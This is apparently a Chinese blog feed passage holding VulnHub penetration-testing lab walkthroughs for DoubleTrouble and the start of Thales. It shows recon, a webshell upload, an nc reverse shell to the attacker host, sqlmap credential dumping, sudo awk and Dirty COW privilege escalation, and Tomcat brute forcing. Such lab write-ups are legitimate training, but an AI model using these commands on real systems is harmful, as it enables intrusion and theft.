    <content type="html"><![CDATA[<h1 id="一-环境搭建"><a href="#一-环境搭建" class="headerlink" title="一.环境搭建"></a>一.环境搭建</h1><h2 id="1-靶场描述"><a href="#1-靶场描述" class="headerlink" title="1.靶场描述"></a>1.靶场描述</h2><pre class="line-numbers language-cobol" data-language="cobol"><code class="language-cobol">get flagsdifficulty<span class="token punctuation">:</span> easyabout vm<span class="token punctuation">:</span> tested <span class="token operator">and</span> exported <span class="token keyword">from</span> virtualbox<span class="token punctuation">.</span> dhcp <span class="token operator">and</span> nested vtx<span class="token operator">/</span>amdv enabled<span class="token punctuation">.</span> you can contact me <span class="token keyword">by</span> email <span class="token keyword">for</span> troubleshooting <span class="token operator">or</span> questions<span class="token punctuation">.</span>This works better <span class="token keyword">with</span> VirtualBox rather <span class="token operator">than</span> VMware <span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre><h2 id="2-下载地址"><a href="#2-下载地址" class="headerlink" title="2.下载地址"></a>2.下载地址</h2><pre class="line-numbers language-cobol" data-language="cobol"><code class="language-cobol">https<span class="token punctuation">:</span><span class="token operator">/</span><span class="token operator">/</span>www<span class="token punctuation">.</span>vulnhub<span class="token punctuation">.</span>com<span class="token operator">/</span><span class="token keyword">entry</span><span class="token operator">/</span>doubletrouble-1<span class="token punctuation">,</span><span class="token number">743</span><span class="token operator">/</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><img src="/./../imgs/$%7Bfiilename%7D/image-20240131202048527.png" alt="image-20240131202048527"></p><h2 id="3-启动靶场"><a href="#3-启动靶场" class="headerlink" title="3.启动靶场"></a>3.启动靶场</h2><p><img src="/./../imgs/$%7Bfiilename%7D/image-20240131202142255.png" alt="image-20240131202142255"></p><p>虚拟机开启之后界面如上，我们不知道ip，需要自己探活，网段知道：192.168.1.0&#x2F;24</p><h1 id="二-渗透测试"><a href="#二-渗透测试" class="headerlink" title="二.渗透测试"></a>二.渗透测试</h1><h2 id="1-目标"><a href="#1-目标" class="headerlink" title="1.目标"></a>1.目标</h2><p>目标就是我们搭建的靶场，靶场IP为：192.168.1.0&#x2F;24</p><h2 id="2-信息收集"><a href="#2-信息收集" class="headerlink" title="2.信息收集"></a>2.信息收集</h2><h3 id="1-寻找靶场真实ip"><a href="#1-寻找靶场真实ip" class="headerlink" title="(1)寻找靶场真实ip"></a>(1)寻找靶场真实ip</h3><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">nmap <span class="token parameter variable">-sP</span> <span class="token number">192.168</span>.1.0/24<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><img src="/./../imgs/$%7Bfiilename%7D/image-20240131202325156.png" alt="image-20240131202325156"></p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">arp-scan <span class="token parameter variable">-l</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><img src="/./../imgs/$%7Bfiilename%7D/image-20240131202547979.png" alt="image-20240131202547979"></p><p>靶场IP地址为:192.168.1.11</p><h3 id="2-探测端口及服务"><a href="#2-探测端口及服务" class="headerlink" title="(2)探测端口及服务"></a>(2)探测端口及服务</h3><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">nmap -p- <span class="token parameter variable">-sV</span> <span class="token number">192.168</span>.1.11<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><img src="/./../imgs/$%7Bfiilename%7D/image-20240131202514903.png" alt="image-20240131202514903"></p><pre class="line-numbers language-none"><code class="language-none">发现开启了22端口, OpenSSH 7.9p1 Debian 10+deb10u2 (protocol 2.0)发现开启了80端口, Apache httpd 2.4.38 ((Debian))<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><h3 id="3-web指纹识别"><a href="#3-web指纹识别" class="headerlink" title="(3)web指纹识别"></a>(3)web指纹识别</h3><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">whatweb <span class="token parameter variable">-v</span> <span class="token number">192.168</span>.1.11<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><img src="/./../imgs/$%7Bfiilename%7D/image-20240131202915403.png" alt="image-20240131202915403"></p><p>扫描到框架是qdPM</p><h2 id="3-渗透测试"><a href="#3-渗透测试" class="headerlink" title="3.渗透测试"></a>3.渗透测试</h2><h3 id="1-访问web服务"><a href="#1-访问web服务" class="headerlink" title="(1)访问web服务"></a>(1)访问web服务</h3><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">http://192.168.1.11<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><img src="/./../imgs/$%7Bfiilename%7D/image-20240131203043423.png" alt="image-20240131203043423"></p><p>我们可以看到是qdPM</p><h3 id="2-扫描web服务"><a href="#2-扫描web服务" class="headerlink" title="(2)扫描web服务"></a>(2)扫描web服务</h3><h4 id="1-棱洞3-0指纹识别"><a href="#1-棱洞3-0指纹识别" class="headerlink" title="1)棱洞3.0指纹识别"></a>1)棱洞3.0指纹识别</h4><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">./EHole_linux_amd64 finger <span class="token parameter variable">-u</span> http://192.168.1.11<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><img src="/./../imgs/$%7Bfiilename%7D/image-20240131203150497.png" alt="image-20240131203150497"></p><h4 id="2-nikto扫描网站结构"><a href="#2-nikto扫描网站结构" class="headerlink" title="2)nikto扫描网站结构"></a>2)nikto扫描网站结构</h4><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">nikto <span class="token parameter variable">-h</span> http://192.168.1.11<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><img src="/./../imgs/$%7Bfiilename%7D/image-20240131203556932.png" alt="image-20240131203556932"></p><p>我们扫描到3个目录，我们一个一个进行访问</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">http://192.168.1.11/images<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><img src="/./../imgs/$%7Bfiilename%7D/image-20240131203328547.png" alt="image-20240131203328547"></p><p>没有任何有用的信息</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">http://192.168.1.11/secret<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><img src="/./../imgs/$%7Bfiilename%7D/image-20240131203444420.png" alt="image-20240131203444420"></p><p>扫描到一个图片，我们先保存下来</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">http://192.168.1.11/template<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><img src="/./../imgs/$%7Bfiilename%7D/image-20240131203509902.png" alt="image-20240131203509902"></p><h4 id="3-dirsearch目录扫描"><a href="#3-dirsearch目录扫描" class="headerlink" title="3)dirsearch目录扫描"></a>3)dirsearch目录扫描</h4><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">dirsearch <span class="token parameter variable">-u</span> <span class="token number">192.168</span>.1.11 <span class="token parameter variable">-e</span> * <span class="token parameter variable">-x</span> <span class="token number">403</span> --random-agent<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><img src="/./../imgs/$%7Bfiilename%7D/image-20240131204018728.png" alt="image-20240131204018728"></p><p>目前，我们掌握的信息是一个qdPM9.1框架和一张图片。</p><h3 id="3-渗透测试-1"><a href="#3-渗透测试-1" class="headerlink" title="(3)渗透测试"></a>(3)渗透测试</h3><h4 id="1-查找漏洞"><a href="#1-查找漏洞" class="headerlink" title="1)查找漏洞"></a>1)查找漏洞</h4><p>我们使用msf查找漏洞，查找到一个漏洞，但是需要密码，这个办法行不通。</p><p><img src="/./../imgs/$%7Bfiilename%7D/image-20240131204241666.png" alt="image-20240131204241666"></p><p>我们使用kali进行查找漏洞，但是漏洞需要密码，还是不行。</p><p><img src="/./../imgs/$%7Bfiilename%7D/image-20240131204542837.png" alt="image-20240131204542837"></p><p><img src="/./../imgs/$%7Bfiilename%7D/image-20240131205145769.png" alt="image-20240131205145769"></p><h4 id="2-图片隐写"><a href="#2-图片隐写" class="headerlink" title="2)图片隐写"></a>2)图片隐写</h4><p>我们想到前面有一个图片，我们进行查看</p><p><img src="/./../imgs/$%7Bfiilename%7D/image-20240131210145045.png" alt="image-20240131210145045"></p><p>使用steghide工具先查看一下图片基本信息,但是需要密码，我们没有密码</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">steghide <span class="token parameter variable">--info</span> <span class="token string">'/home/kali/桌面/doubletrouble.jpg'</span> <span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><img src="/./../imgs/$%7Bfiilename%7D/image-20240131212520438.png" alt="image-20240131212520438"></p><p>我们使用stegseek进行爆破</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">stegseek  <span class="token parameter variable">--crack</span> <span class="token string">'/home/kali/桌面/doubletrouble.jpg'</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><img src="/./../imgs/$%7Bfiilename%7D/image-20240131212820945.png" alt="image-20240131212820945"></p><p>看到账号密码，尝试登录</p><p><img src="/./../imgs/$%7Bfiilename%7D/image-20240131212950912.png" alt="image-20240131212950912"></p><p>我们看到登录成功</p><h4 id="3-文件上传"><a href="#3-文件上传" class="headerlink" title="3)文件上传"></a>3)文件上传</h4><p>我们进行查找，看有没有可以利用的地方，发现这里有上传点</p><p><img src="/./../imgs/$%7Bfiilename%7D/image-20240131213144837.png" alt="image-20240131213144837"></p><p><img src="/./../imgs/$%7Bfiilename%7D/image-20240131213051652.png" alt="image-20240131213051652"></p><p>我们上传一句话木马，连接蚁剑</p><p><img src="/./../imgs/$%7Bfiilename%7D/image-20240131213240845.png" alt="image-20240131213240845"></p><p><img src="/./../imgs/$%7Bfiilename%7D/image-20240131213329376.png" alt="image-20240131213329376"></p><p>我们可以看到连接成功</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">http://192.168.1.11/uploads/users/197129-MS02423.php<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><img src="/./../imgs/$%7Bfiilename%7D/image-20240131213423291.png" alt="image-20240131213423291"></p><h4 id="4-反弹shell"><a href="#4-反弹shell" class="headerlink" title="4)反弹shell"></a>4)反弹shell</h4><pre class="line-numbers language-none"><code class="language-none">nc -e &#x2F;bin&#x2F;bash 192.168.1.9 5555<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><img src="/./../imgs/$%7Bfiilename%7D/image-20240131213826380.png" alt="image-20240131213826380"></p><h4 id="5-提权"><a href="#5-提权" class="headerlink" title="5)提权"></a>5)提权</h4><p>使用sudo -l查看该用户是否具有sudo权限，发现awk可以</p><p><img src="/./../imgs/$%7Bfiilename%7D/image-20240131213941106.png" alt="image-20240131213941106"></p><p>发现awk可以进行无密码使用sudo操作</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token function">sudo</span> <span class="token function">awk</span> <span class="token string">'BEGIN &#123;system("/bin/bash")&#125;'</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><img src="/./../imgs/$%7Bfiilename%7D/image-20240131214648118.png" alt="image-20240131214648118"></p><p>我们进入root查看，发现没有flag,有一个镜像，我们下载下来</p><p><img src="/./../imgs/$%7Bfiilename%7D/image-20240131214809105.png" alt="image-20240131214809105"></p><p>我们把靶机复制到uploads目录下</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token function">cp</span> doubletrouble.ova /var/www/html/uploads<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><img src="/./../imgs/$%7Bfiilename%7D/image-20240131215328396.png" alt="image-20240131215328396"></p><p>因为这个镜像我之前就下载下来了，所以这里我们不用探测ip地址了，ip地址为192.168.1.15</p><h1 id="三-第二个镜像"><a href="#三-第二个镜像" class="headerlink" title="三.第二个镜像"></a>三.第二个镜像</h1><p>我们知道ip地址为192.168.1.15,前面的步骤和第一个是一样的，这里我就进行简写</p><h2 id="1-探测端口及服务"><a href="#1-探测端口及服务" class="headerlink" title="1.探测端口及服务"></a>1.探测端口及服务</h2><p><img src="/./../imgs/$%7Bfiilename%7D/image-20240131215757699.png" alt="image-20240131215757699"></p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">发现开启了22端口, OpenSSH <span class="token number">6</span>.0p1 Debian <span class="token number">4</span>+deb7u4 <span class="token punctuation">(</span>protocol <span class="token number">2.0</span><span class="token punctuation">)</span>发现开启了80端口, Apache httpd <span class="token number">2.2</span>.22 <span class="token variable"><span class="token punctuation">((</span>Debian<span class="token punctuation">))</span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><h2 id="2-访问web服务"><a href="#2-访问web服务" class="headerlink" title="2.访问web服务"></a>2.访问web服务</h2><pre class="line-numbers language-none"><code class="language-none">http:&#x2F;&#x2F;192.168.1.15<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><img src="/./../imgs/$%7Bfiilename%7D/image-20240131221025067.png" alt="image-20240131221025067"></p><p>我们看到是一个登录页面，一般登录页面要么爆破，要么进行测试SQL注入，这个只能进行SQL注入。</p><h2 id="3-SQL注入"><a href="#3-SQL注入" class="headerlink" title="3.SQL注入"></a>3.SQL注入</h2><h3 id="1-测试是否存在SQL注入"><a href="#1-测试是否存在SQL注入" class="headerlink" title="(1)测试是否存在SQL注入"></a>(1)测试是否存在SQL注入</h3><p>首先我们进行抓包</p><p><img src="/./../imgs/$%7Bfiilename%7D/image-20240131221312957.png" alt="image-20240131221312957"></p><p><img src="/./../imgs/$%7Bfiilename%7D/image-20240131221417024.png" alt="image-20240131221417024"></p><p>发现存在SQL注入</p><h3 id="2-爆破数据"><a href="#2-爆破数据" class="headerlink" title="(2)爆破数据"></a>(2)爆破数据</h3><pre class="line-numbers language-sql" data-language="sql"><code class="language-sql">sqlmap <span class="token operator">-</span>r <span class="token string">'/home/kali/Desktop/MS02423.txt'</span> <span class="token comment">--dbs --batch</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><img src="/./../imgs/$%7Bfiilename%7D/image-20240131221808200.png" alt="image-20240131221808200"></p><pre class="line-numbers language-sql" data-language="sql"><code class="language-sql">sqlmap <span class="token operator">-</span>r <span class="token string">'/home/kali/Desktop/MS02423.txt'</span> <span class="token operator">-</span>D <span class="token string">'doubletrouble'</span> <span class="token comment">--tables --batch</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><img src="/./../imgs/$%7Bfiilename%7D/image-20240131221950016.png" alt="image-20240131221950016"></p><pre class="line-numbers language-sql" data-language="sql"><code class="language-sql">sqlmap <span class="token operator">-</span>r <span class="token string">'/home/kali/Desktop/MS02423.txt'</span> <span class="token operator">-</span>D <span class="token string">'doubletrouble'</span> <span class="token operator">-</span>T <span class="token string">'users'</span> <span class="token comment">--columns --batch</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><img src="/./../imgs/$%7Bfiilename%7D/image-20240131222306338.png" alt="image-20240131222306338"></p><pre class="line-numbers language-sql" data-language="sql"><code class="language-sql">sqlmap <span class="token operator">-</span>r <span class="token string">'/home/kali/Desktop/MS02423.txt'</span> <span class="token operator">-</span>D <span class="token string">'doubletrouble'</span> <span class="token operator">-</span>T <span class="token string">'users'</span> <span class="token operator">-</span>C <span class="token string">'username,password'</span> <span class="token comment">--batch --dump</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><img src="/./../imgs/$%7Bfiilename%7D/image-20240131222834208.png" alt="image-20240131222834208"></p><p>最后我们爆破出来2个用户名和密码</p><pre class="line-numbers language-cobol" data-language="cobol"><code class="language-cobol">montreux GfsZxc1  clapton ZubZub99 <span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><h3 id="3-ssh登录"><a href="#3-ssh登录" class="headerlink" title="(3)ssh登录"></a>(3)ssh登录</h3><p>我们使用2个用户名和密码进行登录，发现页面登录不了</p><p><img src="/./../imgs/$%7Bfiilename%7D/image-20240202193519466.png" alt="image-20240202193519466"></p><p>前面扫描端口的时候，发现22端口是开放的，我们进行登录试试</p><p><img src="/./../imgs/$%7Bfiilename%7D/image-20240202193838489.png" alt="image-20240202193838489"></p><p>我们发现montreux登录不了，但是clapton可以</p><p><img src="/./../imgs/$%7Bfiilename%7D/image-20240202194312256.png" alt="image-20240202194312256"></p><p>我们得到了第一个flag</p><h3 id="4-提权"><a href="#4-提权" class="headerlink" title="(4)提权"></a>(4)提权</h3><p>我们使用sudo -l查看，显示不存在</p><p><img src="/./../imgs/$%7Bfiilename%7D/image-20240202194408520.png" alt="image-20240202194408520"></p><p>我们查看内核版本，查找漏洞</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token function">uname</span> <span class="token parameter variable">-a</span> <span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><img src="/./../imgs/$%7Bfiilename%7D/image-20240202194447742.png" alt="image-20240202194447742"></p><p>查看下系统内核版本信息，发现存在脏牛漏洞，内核版本：3.2.0-4-amd64。</p><pre class="line-numbers language-r" data-language="r"><code class="language-r">searchsploit linux <span class="token number">3.2</span>searchsploit <span class="token operator">-</span>m <span class="token number">40616.</span>c   下载<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><p><img src="/./../imgs/$%7Bfiilename%7D/image-20240202195038088.png" alt="image-20240202195038088"></p><p>我们进行查看40616.c内容， 先使用gcc连接，然后直接使用，后面不用跟其他命令</p><p><img src="/./../imgs/$%7Bfiilename%7D/image-20240202195354864.png" alt="image-20240202195354864"></p><p>使用nc传输，将40616.c传输到clapton系统中</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">在clapton的shell中启动nc接收<span class="token function">nc</span> <span class="token parameter variable">-lvnp</span> <span class="token number">10086</span> <span class="token operator">></span> <span class="token number">40616</span>.c<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><p><img src="/./../imgs/$%7Bfiilename%7D/image-20240202195652880.png" alt="image-20240202195652880"></p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">在kali中使用nc上传40616.c<span class="token function">nc</span> <span class="token number">192.168</span>.1.15 <span class="token number">10086</span> <span class="token operator">&lt;</span> <span class="token number">40616</span>.c <span class="token parameter variable">-w</span> <span class="token number">1</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><p><img src="/./../imgs/$%7Bfiilename%7D/image-20240202195828939.png" alt="image-20240202195828939"></p><p><img src="/./../imgs/$%7Bfiilename%7D/image-20240202195918107.png" alt="image-20240202195918107"></p><p>我们可以看到传输成功了</p><p>我们可以看到40616.c没有执行权限，我们加权限</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token function">chmod</span>  <span class="token number">777</span> <span class="token number">40616</span>.c<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><img src="/./../imgs/$%7Bfiilename%7D/image-20240202200100072.png" alt="image-20240202200100072"></p><p>gcc连接，生成可执行程序,进行执行</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">gcc <span class="token number">40616</span>.c <span class="token parameter variable">-o</span> <span class="token number">40616</span>.c <span class="token parameter variable">-pthread</span>./40616.c<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><p><img src="/./../imgs/$%7Bfiilename%7D/image-20240202200440095.png" alt="image-20240202200440095"></p><p>我们可以看到提权成功，查看flag</p><p><img src="/./../imgs/$%7Bfiilename%7D/image-20240202200544952.png" alt="image-20240202200544952"></p><h1 id="三-相关资源"><a href="#三-相关资源" class="headerlink" title="三.相关资源"></a>三.相关资源</h1><p>1.靶场下载地址 </p><p>2.nmap</p><p>3.arp-scan </p><p>4.masscan </p><p>5.[ 常用工具篇 ] 渗透神器 whatweb 安装使用详解 </p><p>6.[ 渗透工具篇 ] EHole(棱洞)3.0安装部署及详解（linux &amp; win） </p><p>7.nikto工具的使用</p><p>8.dirsearch目录扫描</p><p>9.图片隐写</p><p>10.文件上传</p><p>11.反弹shell</p><p>12.SQL注入</p><p>13.ssh登录</p><p>14.脏牛漏洞</p><p>15.gcc</p>]]></content>
    
    
      
      
    <summary type="html">&lt;h1 id=&quot;一-环境搭建&quot;&gt;&lt;a href=&quot;#一-环境搭建&quot; class=&quot;headerlink&quot; title=&quot;一.环境搭建&quot;&gt;&lt;/a&gt;一.环境搭建&lt;/h1&gt;&lt;h2 id=&quot;1-靶场描述&quot;&gt;&lt;a href=&quot;#1-靶场描述&quot; class=&quot;headerlink&quot; titl</summary>
      
    
    
    
    <category term="渗透测试" scheme="http://ms02423.top/categories/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/"/>
    
    
    <category term="vulnhub靶场" scheme="http://ms02423.top/tags/vulnhub%E9%9D%B6%E5%9C%BA/"/>
    
  </entry>
  
  <entry>
    <title>vulnhub靶场之Thales</title>
    <link href="http://ms02423.top/2024/01/29/vulnhub%E9%9D%B6%E5%9C%BA%E4%B9%8BThales/"/>
    <id>http://ms02423.top/2024/01/29/vulnhub%E9%9D%B6%E5%9C%BA%E4%B9%8BThales/</id>
    <published>2024-01-29T08:30:22.000Z</published>
    <updated>2024-01-30T09:33:09.664Z</updated>
    
    <content type="html"><![CDATA[<h1 id="一-环境搭建"><a href="#一-环境搭建" class="headerlink" title="一.环境搭建"></a>一.环境搭建</h1><h2 id="1-靶场描述"><a href="#1-靶场描述" class="headerlink" title="1.靶场描述"></a>1.靶场描述</h2><pre class="line-numbers language-cobol" data-language="cobol"><code class="language-cobol">Description <span class="token punctuation">:</span> <span class="token keyword">Open</span> your eyes <span class="token operator">and</span> change your perspectiveincludes <span class="token number">2</span> flags<span class="token punctuation">:</span>user<span class="token punctuation">.</span>txt <span class="token operator">and</span> root<span class="token punctuation">.</span>txt<span class="token punctuation">.</span>Telegram<span class="token punctuation">:</span> @machineboy141 <span class="token punctuation">(</span><span class="token keyword">for</span> <span class="token keyword">any</span> hint<span class="token punctuation">)</span>This works better <span class="token keyword">with</span> VIrtualBox rathe <span class="token operator">than</span> VMware<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre><h2 id="2-靶场地址"><a href="#2-靶场地址" class="headerlink" title="2.靶场地址"></a>2.靶场地址</h2><pre class="line-numbers language-cobol" data-language="cobol"><code class="language-cobol">https<span class="token punctuation">:</span><span class="token operator">/</span><span class="token operator">/</span>www<span class="token punctuation">.</span>vulnhub<span class="token punctuation">.</span>com<span class="token operator">/</span><span class="token keyword">entry</span><span class="token operator">/</span>thales-1<span class="token punctuation">,</span><span class="token number">749</span><span class="token operator">/</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><img src="/./../imgs/$%7Bfiilename%7D/image-20240129163223146.png" alt="image-20240129163223146"></p><h2 id="3-启动靶场"><a href="#3-启动靶场" class="headerlink" title="3.启动靶场"></a>3.启动靶场</h2><p>Thales靶机在VMware运行会出现bug,所以我们在VirtualBox运行。</p><p><img src="/./../imgs/$%7Bfiilename%7D/image-20240129163328402.png" alt="image-20240129163328402"></p><p>虚拟机开启之后界面如上，我们不知道ip，需要自己探活，因为我们在VirtualBox运行所以网段发生了变化,网段知道：192.168.1.0&#x2F;24</p><h1 id="二-渗透测试"><a href="#二-渗透测试" class="headerlink" title="二.渗透测试"></a>二.渗透测试</h1><h2 id="1-目标"><a href="#1-目标" class="headerlink" title="1.目标"></a>1.目标</h2><p>目标就是我们搭建的靶场，靶场IP为：192.168.1.0&#x2F;24</p><h2 id="2-信息收集"><a href="#2-信息收集" class="headerlink" title="2.信息收集"></a>2.信息收集</h2><h3 id="1-寻找靶场真实ip"><a href="#1-寻找靶场真实ip" class="headerlink" title="(1)寻找靶场真实ip"></a>(1)寻找靶场真实ip</h3><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">nmap <span class="token parameter variable">-sP</span> <span class="token number">192.168</span>.1.0/24<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><img src="/./../imgs/$%7Bfiilename%7D/image-20240129163940132.png" alt="image-20240129163940132"></p><pre class="line-numbers language-none"><code class="language-none">arp-scan -l<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><img src="/./../imgs/$%7Bfiilename%7D/image-20240129164229619.png" alt="image-20240129164229619"></p><p>靶场真实ip地址为192.168.1.13</p><h3 id="2-探测端口及服务"><a href="#2-探测端口及服务" class="headerlink" title="(2)探测端口及服务"></a>(2)探测端口及服务</h3><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">nmap -p- <span class="token parameter variable">-sV</span> <span class="token number">192.168</span>.1.13<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><img src="/./../imgs/$%7Bfiilename%7D/image-20240129164045121.png" alt="image-20240129164045121"></p><pre class="line-numbers language-cobol" data-language="cobol"><code class="language-cobol">发现开启了<span class="token number">22</span>端口<span class="token punctuation">,</span>OpenSSH <span class="token number">7</span><span class="token punctuation">.</span>6p1 Ubuntu 4ubuntu0<span class="token punctuation">.</span><span class="token number">5</span> <span class="token punctuation">(</span>Ubuntu Linux; protocol <span class="token number">2.0</span><span class="token punctuation">)</span>发现开启了<span class="token number">8080</span>端口<span class="token punctuation">,</span>Apache Tomcat <span class="token number">9.0</span><span class="token number">.52</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><h3 id="3-web指纹识别"><a href="#3-web指纹识别" class="headerlink" title="(3)web指纹识别"></a>(3)web指纹识别</h3><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">whatweb <span class="token parameter variable">-v</span> <span class="token number">192.168</span>.1.13:8080<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><img src="/./../imgs/$%7Bfiilename%7D/image-20240129164342897.png" alt="image-20240129164342897"></p><h2 id="3-渗透测试"><a href="#3-渗透测试" class="headerlink" title="3.渗透测试"></a>3.渗透测试</h2><h3 id="1-访问web服务"><a href="#1-访问web服务" class="headerlink" title="(1)访问web服务"></a>(1)访问web服务</h3><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">http://192.168.1.13:8080<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><img src="/./../imgs/$%7Bfiilename%7D/image-20240129164445794.png" alt="image-20240129164445794"></p><p>我们可以看到是Tomcat</p><h3 id="2-扫描web服务"><a href="#2-扫描web服务" class="headerlink" title="(2)扫描web服务"></a>(2)扫描web服务</h3><h4 id="1-棱洞3-0指纹识别"><a href="#1-棱洞3-0指纹识别" class="headerlink" title="1)棱洞3.0指纹识别"></a>1)棱洞3.0指纹识别</h4><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">./EHole_linux_amd64 finger <span class="token parameter variable">-u</span> http://192.168.1.13:8080<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><img src="/./../imgs/$%7Bfiilename%7D/image-20240129164921542.png" alt="image-20240129164921542"></p><h4 id="2-nikto扫描网站结构"><a href="#2-nikto扫描网站结构" class="headerlink" title="2)nikto扫描网站结构"></a>2)nikto扫描网站结构</h4><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">nikto <span class="token parameter variable">-h</span> http://192.168.1.13:8080<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><img src="/./../imgs/$%7Bfiilename%7D/image-20240129164819306.png" alt="image-20240129164819306"></p><h4 id="3-dirsearch目录扫描"><a href="#3-dirsearch目录扫描" class="headerlink" title="3)dirsearch目录扫描"></a>3)dirsearch目录扫描</h4><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">dirsearch <span class="token parameter variable">-u</span> <span class="token number">192.168</span>.1.13:8080 <span class="token parameter variable">-e</span> * <span class="token parameter variable">-x</span> <span class="token number">403</span> --random-agent<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><img src="/./../imgs/$%7Bfiilename%7D/image-20240129165342048.png" alt="image-20240129165342048"></p><p>我们扫描到一个登录页面</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">http://192.168.1.13:8080/manager<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><img src="/./../imgs/$%7Bfiilename%7D/image-20240129165606671.png" alt="image-20240129165606671"></p><p>目前，我们掌握的信息是一个tomcat框架和一个登录页面，因为tomcat 有管理登录页面，于是尝试爆破</p><h3 id="3-渗透测试-1"><a href="#3-渗透测试-1" class="headerlink" title="(3)渗透测试"></a>(3)渗透测试</h3><h4 id="1-msf爆破"><a href="#1-msf爆破" class="headerlink" title="1)msf爆破"></a>1)msf爆破</h4><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">search login tomcat<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><img src="/./../imgs/$%7Bfiilename%7D/image-20240129170544353.png" alt="image-20240129170544353"></p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">show options<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><img src="/./../imgs/$%7Bfiilename%7D/image-20240129170643501.png" alt="image-20240129170643501"></p><pre class="line-numbers language-none"><code class="language-none">set RHOSTS 192.168.1.13<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><img src="/./../imgs/$%7Bfiilename%7D/image-20240129170723929.png" alt="image-20240129170723929"></p><p>爆破出来一个用户名和密码</p><p><img src="/./../imgs/$%7Bfiilename%7D/image-20240129170810334.png" alt="image-20240129170810334"></p><p> tomcat:role1</p><h4 id="2-登录"><a href="#2-登录" class="headerlink" title="2)登录"></a>2)登录</h4><p>我们可以看到登录成功</p><p><img src="/./../imgs/$%7Bfiilename%7D/image-20240129170852364.png" alt="image-20240129170852364"></p><h4 id="3-反弹shell"><a href="#3-反弹shell" class="headerlink" 